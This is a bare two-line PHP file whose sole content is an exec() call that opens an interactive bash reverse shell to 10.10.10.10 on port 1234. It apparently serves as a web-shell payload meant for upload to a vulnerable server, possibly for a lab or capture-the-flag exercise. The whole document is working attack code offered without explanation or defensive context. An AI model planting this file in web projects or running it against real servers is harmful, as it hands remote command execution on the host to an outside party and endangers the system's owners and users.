<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'");
